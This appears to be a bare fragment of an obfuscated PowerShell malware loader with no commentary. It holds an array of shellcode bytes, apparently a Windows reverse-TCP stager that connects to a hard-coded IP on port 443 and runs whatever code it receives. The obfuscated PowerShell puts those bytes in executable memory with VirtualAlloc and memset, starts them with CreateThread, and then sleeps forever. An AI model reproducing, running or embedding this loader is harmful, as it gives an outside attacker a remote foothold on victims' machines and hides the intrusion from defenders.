0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xfb,0x44,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;${g} = 0x1000;if (${z}."LE`NGTh" -gt 0x1000){${g} = ${Z}."l`e`NGtH"};${X}=${w}::("{1}{2}{3}{0}"-f 'alAlloc','V','i','rtu').Invoke(0,0x1000,${g},0x40);for (${I}=0;${I} -le (${Z}."LeN`Gth"-1);${I}++) {${w}::"M`EMseT"([IntPtr](${x}.("{0}{1}" -f'ToInt','32').Invoke()+${i}), ${Z}[${i}], 1)};${W}::("{3}{2}{1}{0}" -f'hread','teT','ea','Cr').Invoke(0,0,${x},0,0,0);for (;;){&("{1}{3}{2}{0}"-f 'p','St','slee','art-') 60};
